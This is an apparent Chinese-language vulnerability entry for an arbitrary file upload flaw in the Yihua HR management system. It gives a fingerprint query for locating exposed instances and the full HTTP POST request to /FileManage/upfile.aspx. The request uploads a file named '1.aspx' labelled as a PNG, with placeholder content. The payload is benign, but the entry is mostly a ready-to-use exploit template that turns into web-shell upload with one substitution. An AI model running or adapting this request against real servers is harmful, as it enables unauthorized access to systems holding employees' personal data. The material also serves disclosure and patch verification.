# 亿华人力资源管理系统upfile存在任意文件上传漏洞

- **系统**：亿华人力资源管理系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.body="亿华人力资源管理系统"`
- **请求**：`POST /FileManage/upfile.aspx HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Type: multipart/form-data; boundary=---------------------------324…`　`Content-Length: 659`　`Cookie: ASP.NET_SessionId=2gs554ezsztrgmbwf1dffzls`

**请求体 / payload**
```
-----------------------------3243433393122674734542415452
Content-Disposition: form-data; name="__VIEWSTATE"
/wEPDwUKMTEwMjM4NDkyMWRktbRwLggX8FeyROMxp865VQxNInwjdx6WjO4Wq+j8FUg=
-----------------------------3243433393122674734542415452
Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"
BD080F3A
-----------------------------3243433393122674734542415452
Content-Disposition: form-data; name="File"; filename="1.aspx"
Content-Type: image/png
123
-----------------------------3243433393122674734542415452
Content-Disposition: form-data; name="UploadButton"
开始上传
-----------------------------32…（脚本共 657 字，完整版见原文）
```

**其他**
- 亿华人力资源管理系统upfile存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 亿华人力资源管理系统